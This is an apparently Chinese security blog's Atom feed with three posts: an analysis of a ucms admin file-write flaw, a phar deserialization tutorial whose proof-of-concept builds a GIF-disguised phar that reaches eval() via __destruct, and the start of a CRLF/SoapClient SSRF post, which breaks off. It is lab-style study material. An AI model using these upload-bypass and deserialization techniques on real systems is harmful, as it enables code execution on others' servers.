<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="https://www.w3.org/2005/Atom">
  <title>风筝</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-08T06:11:22.949Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>风筝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2019/12/07/ucms/"/>
    <id>http://yoursite.com/2019/12/07/ucms/</id>
    <published>2019-12-07T11:48:15.530Z</published>
    <updated>2019-12-08T06:11:22.949Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="title-ucms代码注入漏洞分析"><a href="#title-ucms代码注入漏洞分析" class="headerlink" title="title:ucms代码注入漏洞分析"></a>title:ucms代码注入漏洞分析</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在漏洞平台看到ucms后台漏洞，便寻找了一下开源源码分析一下</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先漏洞发生在后台，也就是需要先登录后台可利用，有点鸡肋，但还是要学习一下</p><p>后台管理中心-&gt;文件管理-&gt;任意选一个编辑-&gt;保存-&gt;抓包<br><img src="https://s2.ax1x.com/2019/12/08/QaSiMF.png" alt="image"></p><p><img src="https://s2.ax1x.com/2019/12/08/QaSURf.png" alt="image"></p><p>然后访问该文件名<br><img src="https://s2.ax1x.com/2019/12/08/QaSgJ0.png" alt="image"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>uncms/index.php 44行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])) &#123;</span><br><span class="line">$thisdo=explode(<span class="string">'_'</span>,$_GET[<span class="string">'do'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span>(<span class="string">'top.php'</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($thisdo[<span class="number">1</span>])) &#123;</span><br><span class="line">$thisdo[<span class="number">1</span>]=<span class="string">'index'</span>;</span><br><span class="line">&#125;</span><br><span class="line">check_admin_file($thisdo[<span class="number">0</span>],$thisdo[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">require</span>($thisdo[<span class="number">0</span>].<span class="string">'/'</span>.$thisdo[<span class="number">1</span>].<span class="string">'.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(power(<span class="string">'s'</span>,<span class="number">0</span>,$power))&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;meta http-equiv=refresh content='0; url=?do=str'&gt;"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>也就是说获取get的do值为文件名，跟踪一下漏洞指的sadmin/fileedit.php文件</p><p>sadmin/fileedit.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'admin'</span>)) &#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line"><span class="keyword">if</span>(power(<span class="string">'alevel'</span>)!=<span class="number">3</span>) &#123;<span class="keyword">die</span>(<span class="string">'error'</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!AdminFileedit) &#123;</span><br><span class="line">adminmsg(<span class="string">''</span>,<span class="string">'文件管理功能已关闭'</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'dir'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'dir'</span>])) &#123;</span><br><span class="line">$_GET[<span class="string">'dir'</span>]=<span class="string">'/'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$getdir=$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'dir'</span>]==<span class="string">'/'</span>) &#123;</span><br><span class="line">$dir=$_GET[<span class="string">'dir'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">$dir=$_GET[<span class="string">'dir'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$alldir=$_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].$_GET[<span class="string">'dir'</span>].<span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">if</span>(stripos($_GET[<span class="string">'dir'</span>],<span class="string">'..'</span>)===<span class="keyword">false</span>) &#123;&#125;<span class="keyword">else</span> &#123;<span class="keyword">die</span>(<span class="string">'error dir'</span>);&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'no dir'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">$filename=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($_GET[<span class="string">'file'</span>],<span class="string">'..'</span>)===<span class="keyword">false</span>) &#123;&#125;<span class="keyword">else</span> &#123;<span class="keyword">die</span>(<span class="string">'error filename'</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!isedit($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'no file'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'co'</span>])) &#123;</span><br><span class="line">checktoken();</span><br><span class="line">$content=$_POST[<span class="string">'co'</span>];</span><br><span class="line">$fp = @fopen($alldir.$filename,<span class="string">"w"</span>);</span><br><span class="line"><span class="keyword">if</span>(!@fwrite($fp,$content) &amp;&amp; strlen($content)&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">adminmsg(<span class="string">''</span>,<span class="string">'写入失败,请修改文件权限'</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">$refererurl=<span class="string">'?do=sadmin_fileedit&amp;dir='</span>.$_GET[<span class="string">'dir'</span>].<span class="string">'&amp;file='</span>.$_GET[<span class="string">'file'</span>].<span class="string">'&amp;pos='</span>.$_POST[<span class="string">'pos'</span>];</span><br><span class="line">adminmsg($refererurl,<span class="string">'保存成功'</span>,<span class="number">1</span>,<span class="string">'编辑页'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_file($alldir.$filename)) &#123;</span><br><span class="line">$content=<span class="string">''</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">$content=htmlspecialchars(file_get_contents($alldir.$filename));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isedit</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">$array=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'css'</span>,<span class="string">'js'</span>,<span class="string">'htm'</span>,<span class="string">'html'</span>,<span class="string">'txt'</span>);</span><br><span class="line"><span class="keyword">foreach</span>($array <span class="keyword">as</span> $val) &#123;</span><br><span class="line"><span class="keyword">if</span>(pathinfo($filename, PATHINFO_EXTENSION)==$val) &#123;</span><br><span class="line"><span class="keyword">Return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">Return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看到该文件对传进来的路径与内容没有进行任何过滤与验证,引发了漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fp = @fopen($alldir.$filename,<span class="string">"w"</span>);</span><br></pre></td></tr></table></figure><p>在请求co参数的时候，这一行，w指当文件不存在的时候会自动创建，由此触发了文件写入漏洞</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://blog.topsec.com.cn/%e5%a4%a9%e8%9e%8d%e4%bf%a1%e5%85%b3%e4%ba%8eucms%e7%b3%bb%e7%bb%9f%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%86%e6%9e%90/" target="_blank" rel="noopener">http://blog.topsec.com.cn/%e5%a4%a9%e8%9e%8d%e4%bf%a1%e5%85%b3%e4%ba%8eucms%e7%b3%bb%e7%bb%9f%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%86%e6%9e%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;title-ucms代码注入漏洞分析&quot;&gt;&lt;a href=&quot;#title-ucms代码注入漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;title:ucms代码注入漏洞分析&quot;&gt;&lt;/a&gt;title:ucms代码注入漏洞分析&lt;/h2&gt;&lt;h2 
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>phar反序列化总结</title>
    <link href="http://yoursite.com/2019/11/11/phar/"/>
    <id>http://yoursite.com/2019/11/11/phar/</id>
    <published>2019-11-11T05:40:51.318Z</published>
    <updated>2019-11-08T10:48:43.021Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h2><p>phar文件是一种压缩文件，在php手册中可以看到各个数据块的信息。</p><p>phar文件的读取是通过phar协议读取的，在读取phar文件的时候，文件内容会转换为对象，Meata-data数据块中的内容会被反序列。<br>四个部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. a stub </span><br><span class="line">一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;,前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</span><br><span class="line"></span><br><span class="line">2. manifest</span><br><span class="line">phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。</span><br><span class="line"></span><br><span class="line">3. contents</span><br><span class="line">压缩文件的内容</span><br><span class="line"></span><br><span class="line">4. signature</span><br><span class="line">文件的签名内容</span><br></pre></td></tr></table></figure></p><h2 id="demo测试"><a href="#demo测试" class="headerlink" title="demo测试"></a>demo测试</h2><p>phar文件的制作可以使用php内置的Phar类来实现。</p><p>前提先将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="phar伪装其它格式文件"><a href="#phar伪装其它格式文件" class="headerlink" title="phar伪装其它格式文件"></a>phar伪装其它格式文件</h2><p>php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $file = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"kite.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"kite.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/07/MEkQyT.png" alt="image"></p><p>可以看到meta-data是以序列化的形式存储的，采用这种方法可以绕过很大一部分上传检测。</p><h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://s2.ax1x.com/2019/11/08/MVLZ7V.png" alt="image"></p><h2 id="demo测试-1"><a href="#demo测试-1" class="headerlink" title="demo测试"></a>demo测试</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; file;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://kite.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/08/MZCkP1.png" alt="image"></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phar文件要能够上传到服务器端。</p><p>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数</p><p>要有可用的魔术方法作为“跳板”。</p><p>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>uoload_file.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/gif"</span>)&amp;&amp;(substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>)+<span class="number">1</span>))== <span class="string">'gif'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">            <span class="string">"upload_file/"</span> .$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Invalid file,you can only upload gif"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>upload_file.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://127.0.0.1/test/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p><p>file_un.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure></p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'123.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">'phpinfo();'</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改后缀名为gif</p><p><img src="https://s2.ax1x.com/2019/11/08/MZtF2t.png" alt="image"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://paper.seebug.org/680/#22-demo" target="_blank" rel="noopener">https://paper.seebug.org/680/#22-demo</a></p><p><a href="https://xz.aliyun.com/t/2715#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715#toc-12</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;phar文件结构&quot;&gt;&lt;a href=&quot;#phar文件结构&quot; class=&quot;headerlink&quot; title=&quot;phar文件结构&quot;&gt;&lt;/a&gt;phar文件结构&lt;/h2&gt;&lt;p&gt;phar文件是一种压缩文件，在php手册中可以看到各个数据块的信息。&lt;/p&gt;
&lt;p&gt;phar
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>crlf &amp; soap</title>
    <link href="http://yoursite.com/2019/11/06/crlf/"/>
    <id>http://yoursite.com/2019/11/06/crlf/</id>
    <published>2019-11-06T15:58:04.532Z</published>
    <updated>2019-11-06T15:58:04.533Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近遇到了个题，然后由此引发了php原生类，最后引发了一道老题许多知识点的深思。。有些文章图床挂了，知识点很多有点乱，便总结一下</p><h2 id="CRLF介绍"><a href="#CRLF介绍" class="headerlink" title="CRLF介绍"></a>CRLF介绍</h2><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><h2 id="SoapClient触发反序列化导致ssrf"><a href="#SoapClient触发反序列化导致ssrf" class="headerlink" title="SoapClient触发反序列化导致ssrf"></a>SoapClient触发反序列化导致ssrf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'__destruct'</span>,</span><br><span class="line">            <span class="string">'__toString'</span>,</span><br><span class="line">            <span class="string">'__wakeup'</span>,</span><br><span class="line">            <span class="string">'__call'</span>,</span><br><span class="line">            <span class="string">'__callStatic'</span>,</span><br><span class="line">            <span class="string">'__get'</span>,</span><br><span class="line">            <span class="string">'__set'</span>,</span><br><span class="line">            <span class="string">'__isset'</span>,</span><br><span class="line">            <span class="string">'__unset'</span>,</span><br><span class="line">            <span class="string">'__invoke'</span>,</span><br><span class="line">            <span class="string">'__set_state'</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> $class . <span class="string">'::'</span> . $method . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过此php脚本可了解魔术方法对应的类</p><p>soap的具体参考<a href="https://www.anquanke.com/post/id/153065#h2-1" target="_blank" rel="noopener">soap安全问题</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。</span><br><span class="line">其采用HTTP作为底层通讯协议，XML作为数据传送的格式</span><br><span class="line">SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。</span><br></pre></td></tr></table></figure><p>php原生类具体参考<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0" target="_blank" 